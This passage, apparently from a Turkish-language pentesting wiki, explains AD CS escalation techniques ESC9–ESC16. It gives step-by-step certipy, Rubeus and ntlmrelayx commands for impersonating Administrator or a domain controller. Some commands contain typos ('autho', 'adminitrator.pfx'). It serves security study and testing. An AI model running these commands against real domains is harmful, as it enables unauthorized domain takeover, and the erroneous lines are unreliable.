- `StrongCertificateBindingEnforcement` `2` olarak ayarlanmamışsa (varsayılan `1`), veya `CertificateMappingMethods` `UPN` bayrağını içeriyorsa.
- Sertifika, `msPKI-Enrollment-Flag` ayarındaki `CT_FLAG_NO_SECURITY_EXTENSION` bayrağı ile işaretlenmişse.
- Sertifika tarafından herhangi bir istemci kimlik doğrulama EKU belirtilmişse.
- Başka bir hesabı tehlikeye atmak için herhangi bir hesap üzerinde `GenericWrite` izinleri mevcutsa.

### İstismar Senaryosu

Diyelim ki `John@corp.local`, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip ve amacı `Administrator@corp.local`'ı tehlikeye atmaktır. `Jane@corp.local`'ın kaydolmasına izin verilen `ESC9` sertifika şablonu, `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` bayrağı ile yapılandırılmıştır.

Başlangıçta, `Jane`'in hash'i, `John`'ın `GenericWrite`'ı sayesinde Shadow Credentials kullanılarak elde edilir:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Sonrasında, `Jane`'in `userPrincipalName` değeri `Administrator` olarak değiştirilir, `@corp.local` alan kısmı kasıtlı olarak atlanır:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bu değişiklik, `Administrator@corp.local`'ın `Administrator`'ın `userPrincipalName`'i olarak farklı kalması nedeniyle kısıtlamaları ihlal etmez.

Bunun ardından, savunmasız olarak işaretlenen `ESC9` sertifika şablonu, `Jane` olarak talep edilir:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Sertifikanın `userPrincipalName`'inin `Administrator` olarak yansıdığı ve herhangi bir “object SID” içermediği belirtilmiştir.

`Jane`'in `userPrincipalName`'i daha sonra orijinaline, `Jane@corp.local` olarak geri döndürülür:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Verilen sertifika ile kimlik doğrulama denemesi artık `Administrator@corp.local` NT hash'ini veriyor. Sertifikanın alan belirtimi eksik olduğundan, komut `-domain <domain>` içermelidir:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Zayıf Sertifika Eşleştirmeleri - ESC10

### Açıklama

ESC10 tarafından belirtilen iki kayıt defteri anahtar değeri alan denetleyicisinde bulunmaktadır:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` altında `CertificateMappingMethods` için varsayılan değer `0x18` (`0x8 | 0x10`), daha önce `0x1F` olarak ayarlanmıştı.
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` altında `StrongCertificateBindingEnforcement` için varsayılan ayar `1`, daha önce `0` idi.

**Durum 1**

`StrongCertificateBindingEnforcement` `0` olarak yapılandırıldığında.

**Durum 2**

Eğer `CertificateMappingMethods` `UPN` bitini (`0x4`) içeriyorsa.

### Kötüye Kullanım Durumu 1

`StrongCertificateBindingEnforcement` `0` olarak yapılandırıldığında, `GenericWrite` izinlerine sahip bir A hesabı, herhangi bir B hesabını tehlikeye atmak için kullanılabilir.

Örneğin, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip bir saldırgan, `Administrator@corp.local` hesabını tehlikeye atmayı hedefler. Prosedür ESC9'u yansıtır ve herhangi bir sertifika şablonunun kullanılmasına izin verir.

İlk olarak, `Jane`'in hash'i Shadow Credentials kullanılarak elde edilir, `GenericWrite`'ı kötüye kullanarak.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Sonrasında, `Jane`'in `userPrincipalName` değeri `Administrator` olarak değiştirilir, kısıtlama ihlalini önlemek için `@corp.local` kısmı kasıtlı olarak atlanır.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bunun ardından, varsayılan `User` şablonunu kullanarak `Jane` olarak istemci kimlik doğrulamasını etkinleştiren bir sertifika talep edilir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName`'i daha sonra orijinal haline, `Jane@corp.local` olarak geri döndürülür.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Elde edilen sertifika ile kimlik doğrulama, `Administrator@corp.local`'ın NT hash'ini verecektir; bu, sertifikada alan bilgileri bulunmadığı için komutta alanın belirtilmesini gerektirir.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

`CertificateMappingMethods` içinde `UPN` bit bayrağı (`0x4`) bulunduğunda, `GenericWrite` izinlerine sahip bir A hesabı, `userPrincipalName` özelliğinden yoksun olan herhangi bir B hesabını, makine hesapları ve yerleşik alan yöneticisi `Administrator` dahil olmak üzere tehlikeye atabilir.

Burada, hedef `DC$@corp.local`'ı tehlikeye atmak ve `Jane`'in hash'ini Shadow Credentials aracılığıyla elde etmek, `GenericWrite`'ı kullanarak başlamaktır.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'in `userPrincipalName` değeri `DC$@corp.local` olarak ayarlanır.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
`Jane` olarak varsayılan `User` şablonunu kullanarak istemci kimlik doğrulaması için bir sertifika talep edilir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName`'i bu işlemden sonra orijinal haline geri döner.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel üzerinden kimlik doğrulamak için, Certipy'nin `-ldap-shell` seçeneği kullanılır ve kimlik doğrulama başarısı `u:CORP\DC$` olarak belirtilir.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell üzerinden, `set_rbcd` gibi komutlar, Kaynak Tabanlı Kısıtlı Delegasyon (RBCD) saldırılarını etkinleştirir ve bu da etki alanı denetleyicisini tehlikeye atabilir.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Bu zafiyet, `userPrincipalName`'ı olmayan veya `sAMAccountName` ile eşleşmeyen herhangi bir kullanıcı hesabını da kapsamaktadır; varsayılan `Administrator@corp.local`, yükseltilmiş LDAP ayrıcalıkları ve varsayılan olarak bir `userPrincipalName`'ın olmaması nedeniyle önemli bir hedef olmaktadır.

## NTLM'yi ICPR'ye İletme - ESC11

### Açıklama

Eğer CA Sunucusu `IF_ENFORCEENCRYPTICERTREQUEST` ile yapılandırılmamışsa, RPC hizmeti aracılığıyla imzalamadan NTLM iletme saldırıları gerçekleştirilebilir. [Burada referans](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/) bulunmaktadır.

`Enforce Encryption for Requests` devre dışı bırakıldığında, `certipy` kullanarak durumu belirleyebilirsiniz ve certipy `ESC11` Zafiyetlerini gösterecektir.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

Bir relay sunucusu kurmak gerekiyor:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Not: Alan denetleyicileri için, DomainController'da `-template` belirtmemiz gerekir.

Veya [sploutchy'nin impacket çatallamasını](https://github.com/sploutchy/impacket) kullanarak:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell erişimi ile ADCS CA ve YubiHSM - ESC12

### Açıklama

Yönetici, Sertifika Otoritesini "Yubico YubiHSM2" gibi harici bir cihazda depolamak için ayarlayabilir.

USB cihazı, CA sunucusuna bir USB portu aracılığıyla bağlıysa veya CA sunucusu sanal bir makineyse bir USB cihaz sunucusu varsa, YubiHSM'de anahtarları oluşturmak ve kullanmak için Anahtar Depolama Sağlayıcısı tarafından bir kimlik doğrulama anahtarı (bazen "şifre" olarak adlandırılır) gereklidir.

Bu anahtar/şifre, `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` altında açık metin olarak kayıt defterinde saklanır.

[burada](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm) referans.

### Suistimal Senaryosu

Eğer CA'nın özel anahtarı fiziksel bir USB cihazında saklanıyorsa ve shell erişimi elde ettiyseniz, anahtarı kurtarmak mümkündür.

Öncelikle, CA sertifikasını (bu kamuya açıktır) elde etmeniz ve ardından:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Son olarak, CA sertifikası ve özel anahtarını kullanarak yeni bir keyfi sertifika oluşturmak için certutil `-sign` komutunu kullanın.

## OID Grup Bağlantı Suistimali - ESC13

### Açıklama

`msPKI-Certificate-Policy` niteliği, sertifika şablonuna ihraç politikasının eklenmesine olanak tanır. Politika ihraçlarından sorumlu `msPKI-Enterprise-Oid` nesneleri, PKI OID konteynerinin Yapılandırma İsimlendirme Bağlamı'nda (CN=OID,CN=Public Key Services,CN=Services) keşfedilebilir. Bir politika, bu nesnenin `msDS-OIDToGroupLink` niteliği kullanılarak bir AD grubuna bağlanabilir ve bu, bir sistemin sertifikayı sunan bir kullanıcıyı grubun üyesiymiş gibi yetkilendirmesine olanak tanır. [Burada referans](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Diğer bir deyişle, bir kullanıcının bir sertifika kaydetme izni olduğunda ve sertifika bir OID grubuna bağlandığında, kullanıcı bu grubun ayrıcalıklarını miras alabilir.

OIDToGroupLink bulmak için [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kullanın:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

Bir kullanıcı izni bulun, `certipy find` veya `Certify.exe find /showAllPermissions` kullanabilir.

Eğer `John`, `VulnerableTemplate`'i kaydetme iznine sahipse, kullanıcı `VulnerableGroup` grubunun ayrıcalıklarını miras alabilir.

Tek yapması gereken şablonu belirtmek, OIDToGroupLink haklarına sahip bir sertifika alacaktır.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Vulnerable Certificate Renewal Configuration- ESC14

### Explanation

The description at https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping is remarkably thorough. Below is a quotation of the original text.

ESC14, "zayıf açık sertifika eşleştirmesi" nedeniyle ortaya çıkan güvenlik açıklarını ele alır; bu, esasen Active Directory kullanıcı veya bilgisayar hesaplarındaki `altSecurityIdentities` niteliğinin kötüye kullanımı veya güvensiz yapılandırması yoluyla gerçekleşir. Bu çok değerli nitelik, yöneticilerin kimlik doğrulama amaçları için X.509 sertifikalarını bir AD hesabıyla manuel olarak ilişkilendirmesine olanak tanır. Doldurulduğunda, bu açık eşleştirmeler, genellikle sertifikanın SAN'ındaki UPN'lere veya DNS adlarına veya `szOID_NTDS_CA_SECURITY_EXT` güvenlik uzantısına gömülü SID'e dayanan varsayılan sertifika eşleştirme mantığını geçersiz kılabilir.

"Zayıf" bir eşleştirme, `altSecurityIdentities` niteliğinde bir sertifikayı tanımlamak için kullanılan dize değeri çok geniş, kolay tahmin edilebilir, benzersiz olmayan sertifika alanlarına dayanıyorsa veya kolayca taklit edilebilen sertifika bileşenleri kullanıyorsa meydana gelir. Bir saldırgan, ayrıcalıklı bir hesap için böyle zayıf tanımlanmış bir açık eşleştirmeye uyan bir sertifikayı elde edebilir veya oluşturabilirse, o sertifikayı kullanarak o hesap olarak kimlik doğrulaması yapabilir ve taklit edebilir.

Potansiyel olarak zayıf `altSecurityIdentities` eşleştirme dizelerine örnekler şunlardır:

- Sadece yaygın bir Subject Common Name (CN) ile eşleştirme: örneğin, `X509:<S>CN=SomeUser`. Bir saldırgan, bu CN ile daha az güvenli bir kaynaktan bir sertifika elde edebilir.
- Daha fazla nitelik olmaksızın aşırı genel İhraççı Ayrıcalıklı İsimler (DN'ler) veya Konu DN'leri kullanmak: örneğin, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Saldırganın meşru olarak elde edebileceği veya sahteleyebileceği bir sertifikada karşılayabileceği diğer tahmin edilebilir kalıplar veya kriptografik olmayan tanımlayıcılar kullanmak (eğer bir CA'yı ele geçirmişse veya ESC1'deki gibi savunmasız bir şablon bulmuşsa).

`altSecurityIdentities` niteliği, eşleştirme için çeşitli formatları destekler, örneğin:

- `X509:<I>IssuerDN<S>SubjectDN` (tam İhraççı ve Konu DN ile eşleştirir)
- `X509:<SKI>SubjectKeyIdentifier` (sertifikanın Konu Anahtar Tanımlayıcı uzantı değeri ile eşleştirir)
- `X509:<SR>SerialNumberBackedByIssuerDN` (seri numarası ile eşleştirir, dolaylı olarak İhraççı DN ile nitelendirilmiştir) - bu standart bir format değildir, genellikle `<I>IssuerDN<SR>SerialNumber` şeklindedir.
- `X509:<RFC822>EmailAddress` (SAN'dan bir RFC822 adı, genellikle bir e-posta adresi ile eşleştirir)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (sertifikanın ham genel anahtarının SHA1 hash'i ile eşleştirir - genellikle güçlüdür)

Bu eşleştirmelerin güvenliği, eşleştirme dizesinde kullanılan seçilen sertifika tanımlayıcılarının özgüllüğüne, benzersizliğine ve kriptografik gücüne büyük ölçüde bağlıdır. Alan Denetleyicileri üzerinde güçlü sertifika bağlama modları etkinleştirilmiş olsa bile (bu, esasen SAN UPN'leri/DNS ve SID uzantısına dayanan dolaylı eşleştirmeleri etkiler), kötü yapılandırılmış bir `altSecurityIdentities` girişi, eşleştirme mantığı hatalı veya çok izin verici olduğunda hala taklit için doğrudan bir yol sunabilir.
### Abuse Scenario

ESC14, Active Directory (AD) içindeki **açık sertifika eşleştirmelerini** hedef alır, özellikle `altSecurityIdentities` niteliğini. Bu nitelik ayarlandığında (tasarım gereği veya yanlış yapılandırma ile), saldırganlar eşleştirmeye uyan sertifikaları sunarak hesapları taklit edebilirler.

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

**Precondition**: Saldırganın hedef hesabın `altSecurityIdentities` niteliğine yazma izinleri vardır veya hedef AD nesnesi üzerindeki aşağıdaki izinlerden birini verme iznine sahiptir:
- Yazma niteliği `altSecurityIdentities`
- Yazma niteliği `Public-Information`
- Yazma niteliği (tümü)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Sahip*.
#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **Precondition**: Hedef, altSecurityIdentities içinde zayıf bir X509RFC822 eşleştirmesine sahiptir. Bir saldırgan, kurbanın e-posta niteliğini hedefin X509RFC822 adıyla eşleşecek şekilde ayarlayabilir, kurban olarak bir sertifika kaydedebilir ve bunu hedef olarak kimlik doğrulamak için kullanabilir.
#### Scenario C: Target Has X509IssuerSubject Mapping

- **Precondition**: Hedef, `altSecurityIdentities` içinde zayıf bir X509IssuerSubject açık eşleştirmesine sahiptir. Saldırgan, kurbanın ana niteliğini hedefin X509IssuerSubject eşleştirmesinin konusu ile eşleşecek şekilde ayarlayabilir. Ardından, saldırgan kurban olarak bir sertifika kaydedebilir ve bu sertifikayı hedef olarak kimlik doğrulamak için kullanabilir.
#### Scenario D: Target Has X509SubjectOnly Mapping

- **Precondition**: Hedef, `altSecurityIdentities` içinde zayıf bir X509SubjectOnly açık eşleştirmesine sahiptir. Saldırgan, kurbanın ana niteliğini hedefin X509SubjectOnly eşleştirmesinin konusu ile eşleşecek şekilde ayarlayabilir. Ardından, saldırgan kurban olarak bir sertifika kaydedebilir ve bu sertifikayı hedef olarak kimlik doğrulamak için kullanabilir.
### concrete operations
#### Scenario A

Request a certificate of the certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Sertifikayı kaydedin ve dönüştürün
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Kimlik doğrulama (sertifika kullanarak)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Temizlik (isteğe bağlı)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
For more specific attack methods in various attack scenarios, please refer to the following: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Uygulama Politikaları(CVE-2024-49019) - ESC15

### Açıklama

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc adresindeki açıklama son derece kapsamlıdır. Aşağıda orijinal metnin bir alıntısı bulunmaktadır.

Yerleşik varsayılan sürüm 1 sertifika şablonlarını kullanarak, bir saldırgan, şablonda belirtilen yapılandırılmış Genişletilmiş Anahtar Kullanım özelliklerinden daha fazla tercih edilen uygulama politikalarını içerecek şekilde bir CSR oluşturabilir. Tek gereklilik kayıt haklarıdır ve bu, **_WebServer_** şablonunu kullanarak istemci kimlik doğrulama, sertifika talep aracı ve kod imzalama sertifikaları oluşturmak için kullanılabilir.

### Suistimal

Aşağıdaki, [bu bağlantıya](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) atıfta bulunmaktadır, daha ayrıntılı kullanım yöntemlerini görmek için tıklayın.

Certipy'nin `find` komutu, CA yamanmamışsa ESC15'e potansiyel olarak duyarlı V1 şablonlarını tanımlamaya yardımcı olabilir.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Senaryo A: Schannel Üzerinden Doğrudan Taklit

**Adım 1: "Client Authentication" Uygulama Politikasını ve hedef UPN'yi enjekte ederek bir sertifika talep et.** Saldırgan `attacker@corp.local`, "WebServer" V1 şablonunu kullanarak `administrator@corp.local` hedef alır (bu, kaydolanın sağladığı konuyu izin verir).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: "Enrollee supplies subject" ile birlikte savunmasız V1 şablonu.
- `-application-policies 'Client Authentication'`: CSR'nin Uygulama Politikaları uzantısına OID `1.3.6.1.5.5.7.3.2` enjekte eder.
- `-upn 'administrator@corp.local'`: Taklit için SAN'da UPN'yi ayarlar.

**Adım 2: Elde edilen sertifikayı kullanarak Schannel (LDAPS) üzerinden kimlik doğrulaması yapın.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Senaryo B: PKINIT/Kerberos Taklit Etme Yoluyla Kayıt Ajanı İstismarı

**Adım 1: "Enrollee supplies subject" ile bir V1 şablonundan bir sertifika talep edin, "Certificate Request Agent" Uygulama Politikasını enjekte edin.** Bu sertifika, saldırganın (`attacker@corp.local`) bir kayıt ajanı olmasını sağlamak içindir. Burada saldırganın kendi kimliği için bir UPN belirtilmemiştir, çünkü amaç ajan yeteneğidir.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` enjekte eder.

**Adım 2: Hedef ayrıcalıklı bir kullanıcı adına bir sertifika talep etmek için "agent" sertifikasını kullanın.** Bu, Adım 1'deki sertifikayı agent sertifikası olarak kullanarak ESC3 benzeri bir adımdır.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Adım 3: "on-behalf-of" sertifikasını kullanarak ayrıcalıklı kullanıcı olarak kimlik doğrulaması yapın.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA'da Güvenlik Uzantısı Devre Dışı (Küresel)-ESC16

### Açıklama

**ESC16 (Eksik szOID_NTDS_CA_SECURITY_EXT Uzantısı Yoluyla Yetki Yükseltme)**, AD CS yapılandırmasının tüm sertifikalarda **szOID_NTDS_CA_SECURITY_EXT** uzantısının dahil edilmesini zorunlu kılmadığı senaryoyu ifade eder; bir saldırgan bunu şu şekilde istismar edebilir:

1. **SID bağlaması olmadan** bir sertifika talep ederek.

2. Bu sertifikayı **herhangi bir hesap olarak kimlik doğrulama için** kullanarak, yüksek ayrıcalıklı bir hesabı taklit etmek (örneğin, bir Alan Yöneticisi).

Daha fazla bilgi için bu makaleye de göz atabilirsiniz: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### İstismar

Aşağıdaki, [bu bağlantıya](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) atıfta bulunmaktadır, daha ayrıntılı kullanım yöntemlerini görmek için tıklayın.

Active Directory Sertifika Hizmetleri (AD CS) ortamının **ESC16**'ya karşı savunmasız olup olmadığını belirlemek için
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Adım 1: Kurban hesabının başlangıç UPN'sini okuyun (İsteğe bağlı - geri yükleme için).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Adım 2: Kurban hesabının UPN'sini hedef yöneticinin `sAMAccountName`'ine güncelleyin.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Adım 3: (Gerekirse) "kurban" hesabı için kimlik bilgilerini elde et (örneğin, Shadow Credentials aracılığıyla).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Adım 4: ESC16'ya duyarlı CA'dan _herhangi bir uygun istemci kimlik doğrulama şablonu_ (örneğin, "Kullanıcı") olarak "kurban" kullanıcısından bir sertifika talep edin.** CA, ESC16'ya duyarlı olduğu için, bu uzantının şablonun belirli ayarlarından bağımsız olarak, verilen sertifikadan SID güvenlik uzantısını otomatik olarak hariç tutacaktır. Kerberos kimlik bilgisi önbellek ortam değişkenini ayarlayın (shell komutu):
```bash
export KRB5CCNAME=victim.ccache
```
Sonra sertifikayı talep et:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Adım 5: "kurban" hesabının UPN'sini geri al.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Adım 6: Hedef yönetici olarak kimlik doğrulaması yapın.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Ormanların Sertifikalarla Ele Geçirilmesi Pasif Sesle Açıklandı

### Ele Geçirilmiş CA'lar Tarafından Orman Güvenlerinin Kırılması

**Çapraz orman kaydı** için yapılandırma nispeten basittir. **Kaynak ormandaki kök CA sertifikası**, yöneticiler tarafından **hesap ormanlarına yayımlanır** ve kaynak ormandaki **kurumsal CA** sertifikaları, her hesap ormanındaki `NTAuthCertificates` ve AIA konteynerlerine **eklenir**. Bu düzenleme, **kaynak ormandaki CA'ya**, yönettiği PKI için tüm diğer ormanlar üzerinde tam kontrol sağlar. Eğer bu CA **saldırganlar tarafından ele geçirilirse**, hem kaynak hem de hesap ormanlarındaki tüm kullanıcılar için sertifikalar **onlar tarafından sahte olarak oluşturulabilir**, böylece ormanın güvenlik sınırı kırılmış olur.

### Yabancı Temsilcilere Verilen Kayıt Ayrıcalıkları

Çoklu orman ortamlarında, **Sertifika şablonları yayımlayan Kurumsal CA'lar** ile ilgili dikkatli olunmalıdır; bu şablonlar **Kimlik Doğrulanmış Kullanıcılar veya yabancı temsilcilere** (Kurumsal CA'nın ait olduğu ormanın dışındaki kullanıcılar/gruplar) **kayıt ve düzenleme hakları** tanır.\
Bir güven ilişkisi üzerinden kimlik doğrulama yapıldığında, **Kimlik Doğrulanmış Kullanıcı SID** AD tarafından kullanıcının token'ına eklenir. Dolayısıyla, eğer bir alan, **Kimlik Doğrulanmış Kullanıcıların kayıt haklarına** sahip bir Kurumsal CA'ya sahipse, bir kullanıcı **farklı bir ormandan bir şablona kayıt olabilme** potansiyeline sahip olabilir. Benzer şekilde, eğer **bir şablon tarafından bir yabancı temsilciye açıkça kayıt hakları verilirse**, bu durumda **çapraz orman erişim kontrol ilişkisi** oluşturulmuş olur; bu da bir ormandan bir temsilcinin **başka bir ormandan bir şablona kayıt olmasını** sağlar.

Her iki senaryo da bir ormandan diğerine **saldırı yüzeyinin artmasına** yol açar. Sertifika şablonunun ayarları, bir saldırgan tarafından yabancı bir alanda ek ayrıcalıklar elde etmek için istismar edilebilir.

{{#include ../../../banners/hacktricks-training.md}}
